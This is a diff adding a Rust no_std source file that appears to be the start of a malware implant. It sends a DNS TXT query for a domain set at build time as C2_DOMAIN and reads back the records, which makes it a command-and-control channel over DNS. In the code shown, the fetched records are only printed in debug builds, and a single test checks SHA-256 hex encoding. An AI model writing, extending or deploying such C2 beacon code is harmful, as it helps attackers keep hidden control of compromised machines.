@@ -1,0 +1,128 @@
+#![no_std]
+#![no_main]
+extern crate alloc;
+
+mod socket;
+
+mod hex;
+
+#[cfg(debug_assertions)]
+mod debug;
+
+#[cfg(debug_assertions)]
+pub use debug::print;
+
+use talc::{*, source::Claim};
+use alloc::vec::Vec;
+use simple_dns::{Packet, PacketFlag, Question, CLASS, TYPE};
+use simple_dns::rdata::RData;
+
+
+const C2_DOMAIN: &str = env!("C2_DOMAIN");
+
+const fn parse_u8(s: &str) -> u8 {
+    let b = s.as_bytes();
+    let mut i = 0;
+    let mut n: u16 = 0;
+    while i < b.len() {
+        n = n * 10 + (b[i] - b'0') as u16;
+        i += 1;
+    }
+    n as u8
+}
+
+macro_rules! env_u8 {
+    ($name:expr) => { parse_u8(env!($name)) };
+}
+
+const DNS_SERVER: [u8; 4] = [env_u8!("DNS_1"), env_u8!("DNS_2"), env_u8!("DNS_3"), env_u8!("DNS_4")];
+    
+#[global_allocator]
+static TALC: TalcLock<spinning_top::RawSpinlock, Claim> = TalcLock::new(unsafe {
+    static mut INITIAL_HEAP: [u8; min_first_heap_size::<DefaultBinning>() + 2000] =
+        [0; min_first_heap_size::<DefaultBinning>() + 2000];
+    Claim::array(&raw mut INITIAL_HEAP)
+});
+
+pub struct Resolver {
+    server: [u8; 4],
+}
+
+impl Resolver {
+    pub const fn new(server: [u8; 4]) -> Self {
+        Self { server }
+    }
+
+    pub fn query_txt(&self, name: &str) -> Option<Vec<Vec<u8>>> {
+        let mut packet = Packet::new_query(0xF1AC);
+        packet.set_flags(PacketFlag::RECURSION_DESIRED);
+        packet.questions.push(
+            Question::new(
+                name.try_into().ok()?,
+                TYPE::TXT.into(),
+                CLASS::IN.into(),
+                false,
+            )
+        );
+        let query_bytes = packet.build_bytes_vec().ok()?;
+
+        let mut resp_buf = [0u8; 4096];
+        let rlen = socket::udp_query(
+            self.server,
+            53,
+            &query_bytes,
+            &mut resp_buf,
+            5,
+        )?;
+
+        let response = Packet::parse(&resp_buf[..rlen]).ok()?;
+        let mut results = Vec::new();
+
+        for answer in response.answers {
+            match answer.rdata {
+                RData::TXT(txt) => {
+                    let mut data = Vec::new();
+                    for (key, value) in txt.iter_raw() {
+                        data.extend_from_slice(key);
+                        if let Some(value) = value {
+                            data.extend_from_slice(value);
+                        }
+                    }
+                    results.push(data);
+                }
+                _ => {}
+            }
+        }
+
+        if results.is_empty() { None } else { Some(results) }
+    }
+}
+
+#[unsafe(no_mangle)]
+extern "C" fn main() -> i32 {
+    let resolver = Resolver::new(DNS_SERVER);
+    if let Some(txt_records) = resolver.query_txt(C2_DOMAIN) {
+        for txt in &txt_records {
+            match core::str::from_utf8(txt) {
+                Ok(s)  => { #[cfg(debug_assertions)] println!("{}", s); },
+                Err(_) => { #[cfg(debug_assertions)] println!("(invalid utf8)"); },
+            }
+        }
+    } else {
+        #[cfg(debug_assertions)]
+        println!("no records returned");
+    }
+    0
+}
+
+#[cfg(test)]
+mod tests {
+    use crate::hex;
+    use sha2::{Digest, Sha256};
+    const STRING: &str = "test";
+
+    #[test]
+    fn test_hex_sha256() { // tests sha256 and hex encoding
+        assert_eq!("9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", hex::encode(Sha256::digest(STRING.as_bytes())));
+    }
+}
